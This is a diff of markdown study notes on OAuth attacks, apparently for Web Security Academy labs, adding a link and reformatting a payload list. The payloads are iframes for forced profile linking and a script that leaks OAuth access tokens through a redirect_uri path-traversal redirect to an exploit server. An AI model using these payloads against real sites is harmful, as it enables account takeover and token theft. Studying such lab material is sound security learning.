@@ -8,6 +8,11 @@
 	> authorization code
 	> implicit (token via browser)
 ```
+
+- [oauth simplified](https://aaronparecki.com/oauth-2-simplified/)
+
+>❗ remove the scope or add oauth 
+
 ## Walkthrough - Most Important Labs
 - [Forced-OAuth-profile-linking-(no-state-param+CSRF)](Forced-OAuth-profile-linking-(no-state-param+CSRF).md)
 
@@ -35,18 +40,21 @@
 /reg -> redirect_uris, logo_uri  -> register user + obtain  client_id +  SSRF
 /client/<client_id/logo 
 ```
+
 ## Payloads examples
 ```js
 <iframe src="<IP>/oauth-linking?code=STOLEN-CODE"></iframe>
-//----------------------//
+
+//
 <iframe src="https://<OAUTH-IP>/auth?client_id=<YOUR-CLIENT-ID>f&redirect_uri=<EXPLOIT-SV>&response_type=code&scope=openid%20profile%20email"hidden="hidden"></iframe>
-//----------------------//
+
+//
 <script>
-  if (!document.location.hash) {
-    window.location = 'https://<OAUTH-IP>/auth?client_id=g4c0gltgknmy2ycmupioa&redirect_uri=<IP-LAB>/oauth-callback/../post/next?path=https://<EXPLOIT-SV>&response_type=token&nonce=1727033259&scope=openid%20profile%20email';
-  } else {
-    window.location = '/?' + document.location.hash.substr(1);
-  }
+    if (!document.location.hash) {
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
 </script>
 ```
 
